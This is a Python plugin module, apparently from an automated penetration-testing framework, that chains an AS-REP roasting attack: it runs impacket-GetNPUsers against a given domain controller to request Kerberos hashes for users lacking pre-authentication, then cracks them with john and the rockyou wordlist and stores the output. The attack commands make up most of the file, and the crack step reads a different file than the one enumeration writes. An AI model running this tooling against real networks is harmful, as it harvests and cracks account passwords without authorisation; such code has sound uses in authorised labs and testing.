import tools.strings.hashcrack as HashCrack
import lib.host as Host
import os


def parameters() -> dict:
    return {
        "distinguish_name": {
            "type": str,
            "description": "The domain controller to query. Example: htb.local",
            "required": True
        },
        "userEnumCmd": {
            "type": str,
            "description": "The query string to execute.",
            "required": True,
            "default": "impacket-GetNPUsers -request -format hashcat -outputfile cache/ldap_gnanpk_result.txt -dc-ip $$config:DefaultConnections.targetMachine <DISTINGUISH_NAME>/"
        },
        "pwCrackCmd": {
            "type": str,
            "description": "The query string to execute.",
            "required": True,
            "default": "john --wordlist=/usr/share/wordlists/rockyou.txt cache/pwcrack_result.txt"
        },
        "return": {
            "type": str,
            "description": "Returns the result of ldap search."
        }
    }


def init() -> tuple:
    return HashCrack.init()


def resultAnalysis(result: tuple) -> str:
    if result[0] == 0:
        from lib.memory import Memory
        Memory.set("ldap_search_users", result[1])
        return result[1]
    else:
        return "STDOUT: " + result[1] + "\n\n\nSTDERR: " + result[2]


def kali(distinguish_name: str, userEnumCmd: str, pwCrackCmd: str) -> tuple:
    userEnumCmd = userEnumCmd.replace("<DISTINGUISH_NAME>", distinguish_name)
    commandStruct = userEnumCmd.split(" ")

    print("Running user enumeration...")
    searchResult = Host.executeShellScript(commandStruct)
    if searchResult[0] != 0:
        print("User enumeration failed.")
        print("STDOUT: ", searchResult[1])
        print("STDERR: ", searchResult[2])
        return searchResult

    crackResult = HashCrack.kali(pwCrackCmd)

    return crackResult
